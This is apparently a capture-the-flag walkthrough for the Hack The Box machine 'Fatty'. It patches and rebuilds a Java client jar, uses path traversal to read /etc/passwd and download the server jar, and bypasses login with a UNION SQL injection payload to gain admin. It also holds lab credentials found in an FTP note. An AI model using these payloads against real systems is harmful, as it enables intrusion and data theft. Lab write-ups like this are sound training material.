An FTP has anonymous access and contains these files:
- fatty-client.jar
- note.txt: port changed from 8000 to 1337
- note2.txt: client application relies on Java 8
- note3.txt: login with qtc:clarabibi

1. Run wireshark to find connection and port
- fatty-client.jar communicates with server.fatty.htb
2. Start Admin cmd and add the following
```
echo 10.10.10.174    server.fatty.htb >> C:\Windows\System32\drivers\etc\hosts
```
3. Right-click on fatty-client.jar and extract to a new file, fatty-client
4. Start PowerShell as administrator
```
ls fatty-client\ -recurse | Select-String "8000" | Select Path, LineNumber | Format-List
```
5. After reading file, we realize a value is set to 8000, let's change that. Edit the line <constructor-arg index="1" value = "8000"/> in beans.xml to be 1337.
6. Remove hashes from fatty-client\META-INF\MANIFEST.MF and delete the 1.RSA and 1.SF files from the META-INF directory. The modified MAINFEST.MF should end with a new line.
7. Run the following
```
cd .\fatty-client
jar -cmf .\META-INF\MANIFEST.MF ..\fatty-client-new.jar *
```
8. Login and explore the application

## Path Traversal

9. Path Traversal in the field and click open
```
../../../../../../etc/passwd
```
10. Decompile the application (drag-and-drop) with JD-GUI: http://java-decompiler.github.io/
11. Save the source code by pressing the Save All Sources option in jdgui. Decompress the fatty-client-new.jar.src.zip by right-clicking and selecting Extract files. The file fatty-client-new.jar.src/htb/fatty/client/methods/Invoker.java handles the application features. Reading its content reveals the following code.
```
public String showFiles(String folder) throws MessageParseException, MessageBuildException, IOException {
    String methodName = (new Object() {
      
      }).getClass().getEnclosingMethod().getName();
    logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
    if (AccessCheck.checkAccess(methodName, this.user))
      return "Error: Method '" + methodName + "' is not allowed for this user account"; 
    this.action = new ActionMessage(this.sessionID, "files");
    this.action.addArgument(folder);
    sendAndRecv();
    if (this.response.hasError())
      return "Error: Your action caused an error on the application server!"; 
    return this.response.getContentAsString();
  }
```
12. The showFiles function takes in one argument for the folder name and then sends the data to the server using the sendAndRecv() call. The file  fatty-client-new.jar.src/htb/fatty/client/gui/ClientGuiTest.java sets the folder option.
```
configs.addActionListener(new ActionListener() {
          public void actionPerformed(ActionEvent e) {
            String response = "";
            ClientGuiTest.this.currentFolder = "configs";
            try {
              response = ClientGuiTest.this.invoker.showFiles("configs");
            } catch (MessageBuildException|htb.fatty.shared.message.MessageParseException e1) {
              JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);
            } catch (IOException e2) {
              JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);
            } 
            textPane.setText(response);
          }
        });
```
13. Replace the configs folder with ..
```
ClientGuiTest.this.currentFolder = "..";
  try {
    response = ClientGuiTest.this.invoker.showFiles("..");
```
14. Compile the ClientGuiTest.Java file
```
javac -cp fatty-client-new.jar fatty-client-new.jar.src\htb\fatty\client\gui\ClientGuiTest.java
```
15. Create a new folder and extract the contents of fatty-client-new.jar into it.
```
mkdir raw
cp fatty-client-new.jar raw\fatty-client-new-2.jar
```
16. Navigate to the raw directory and decompress fatty-client-new-2.jar by right-clicking and selecting Extract here. Overwrite any exxisting htb/fatty/client/gui/*.class files with the updated class files.
```
mv -Force fatty-client-new.jar.src\htb\fatty\client\gui\*.class raw\htb\fatty\client\gui\
```
17. Build new JAR file
```
cd raw
jar -cmf META-INF\MANIFEST.MF traverse.jar .
```
18. Login and we see the /config/../ directory. Application runs inside an Alpine docker container.
19. Modify open function in fatty-client-new.jar.src/htb/fatty/client/methods/Invoker.java to download the file fatty-server.jar
```
import java.io.FileOutputStream;
<SNIP>
public String open(String foldername, String filename) throws MessageParseException, MessageBuildException, IOException {
    String methodName = (new Object() {}).getClass().getEnclosingMethod().getName();
    logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
    if (AccessCheck.checkAccess(methodName, this.user)) {
        return "Error: Method '" + methodName + "' is not allowed for this user account";
    }
    this.action = new ActionMessage(this.sessionID, "open");
    this.action.addArgument(foldername);
    this.action.addArgument(filename);
    sendAndRecv();
    String desktopPath = System.getProperty("user.home") + "\\Desktop\\fatty-server.jar";
    FileOutputStream fos = new FileOutputStream(desktopPath);
    
    if (this.response.hasError()) {
        return "Error: Your action caused an error on the application server!";
    }
    
    byte[] content = this.response.getContent();
    fos.write(content);
    fos.close();
    
    return "Successfully saved the file to " + desktopPath;
}
<SNIP>
```
20. We can now examine the fatty-server.jar that is on our desktop

## SQL Injection
21. Decompiling the fatty-server.jar using JD-GUI reveals the file htb/fatty/server/database/FattyDbSession.class that contains a checkLogin() function that handles the login functionality.
22. Check the username and password functions in htb/fatty/shared/resources/user.java. We find that the password changes to SHA256(username + password + "clarabibimakeseverythingsecure")
23. Also, username is passed directly into query, making it vulnerable to sql injection
```
rs = stmt.executeQuery("SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "'");
```
24. We can inject a new user with UNION SELECT
25. Edit htb/fatty/shared/resources/User.java to submit the password as it is from the client application.
```
public User(int uid, String username, String password, String email, Role role) {
    this.uid = uid;
    this.username = username;
    this.password = password;
    this.email = email;
    this.role = role;
}
public void setPassword(String password) {
    this.password = password;
  }
```
27. Rebuild JAR file and input this into username with password 'abc'
```
abc' UNION SELECT 1,'abc','a@b.com','abc','admin
```
26. Login as admin!
